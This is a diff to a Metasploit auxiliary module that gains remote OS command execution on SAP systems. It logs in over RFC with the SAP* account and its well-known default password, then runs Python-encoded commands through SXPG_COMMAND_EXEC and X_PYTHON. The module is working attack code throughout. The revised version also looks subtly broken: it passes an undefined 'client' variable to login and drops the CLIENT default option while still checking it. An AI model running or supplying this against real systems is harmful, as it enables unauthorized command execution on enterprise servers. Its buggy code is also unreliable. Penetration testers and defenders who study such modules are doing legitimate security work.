@@ -31,57 +31,57 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'SAP RFC SXPG_CALL_SYSTEM',
-      'Description'    => %q{
-        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
+      'Name' => 'SAP RFC X_PYTHON SXPG_COMMAND_EXEC',
+      'Description' => %q{
+        This module makes use of the SXPG_COMMAND_EXEC Remote Function Call to execute OS commands as configured in SM69.
+        It uses the X_PYTHON library to execute the command and returns the call output plus the exit code.
         The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
       },
-      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
-      'Author'         => [ 'nmonkee' ],
-      'License'        => BSD_LICENSE,
-      'DefaultOptions' => {
-        'CLIENT' => "000"
-      }
+      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/' ]],
+      'Author' => [ 'Ben Campbell', 'nmonkee' ],
+      'License' => MSF_LICENSE,
     )
 
     register_options(
-    [
-      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-      OptString.new('PASSWORD', [true, 'Password', '06071992']),
-      OptString.new('CMD', [true, 'Command Name as in SM69', 'ENV']),
-      OptString.new('PARAM', [false, 'Command Parameters', '']),
-    ], self.class)
+      [
+        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+        OptString.new('PASSWORD', [true, 'Password', '06071992']),
+        OptString.new('CMD', [true, 'Command', 'id']),
+      ], self.class)
   end
 
   def run_host(rhost)
+    res = nil
     user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    password = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'])
-    if res.blank?
-      print_error("#{rhost}:#{rport} [SAP] No output returned")
+    cmd = encode_command_python(datastore['CMD'])
+    exec = encode_python(cmd)
+
+    if exec.length > 255
+      # do python stager to file like exploit if needed
+      print_error("#{rhost}:#{rport} [SAP] Encoded command length must not exceed 255 characters - #{exec.length}")
     else
-      print res
-    end
-  end
+      opts = {
+        :OPERATINGSYSTEM => 'ANYOS',
+        :COMMANDNAME => 'X_PYTHON',
+        :ADDITIONAL_PARAMETERS => exec
+      }
 
-  def exec_CMD(user, client, password, rhost, rport, cmd, param)
-    data = nil
-    param = '' unless param
-
-    login(rhost, rport, client, user, password) do |conn|
-      conn.connection_info
-      begin
-        data = sxpg_call_system(conn, {:COMMANDNAME => cmd, :ADDITIONAL_PARAMETERS => param})
-      rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
+      login(rhost, rport, client, user, password) do |conn|
+        res = sxpg_command_execute(conn, opts)
       end
     end
 
-    data
+    if res
+      print_line res
+    else
+      print_error("#{rhost}:#{rport} [SAP] No response from cmd '#{datastore['CMD']}'")
+    end
   end
+
 end
 
